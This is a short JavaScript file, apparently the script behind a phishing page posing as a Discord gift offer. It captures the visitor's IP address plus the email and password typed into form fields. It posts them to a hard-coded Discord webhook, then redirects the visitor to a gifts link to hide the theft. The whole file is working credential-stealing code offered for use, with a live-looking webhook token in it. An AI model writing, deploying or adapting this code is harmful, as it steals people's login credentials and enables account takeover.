const whurl = 'https://discord.com/api/webhooks/1134836423535628358/q1J5auRTp7K2sd5xX6xV7aWqWj-eW4V74qbf41Yrbq2AWlaGf8MiZ7FUKAbyapqBvTKD';

let clientIp;
fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => clientIp = data.ip);

fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => clientIp = data.ip);

function balls(){
    const msg = {
        'content': 'Ip: ' + clientIp + '\n'
                    + 'Email: ' + document.getElementById('187').value + '\n'
                    + 'Password: ' + document.getElementById('287').value
    };

    fetch(whurl, {"method":"POST", "headers": {"content-type": "application/json"},"body": JSON.stringify(msg)});

    setTimeout(() => {  window.location.replace("https://discord.com/gifts/fd732d"); }, 500);
}
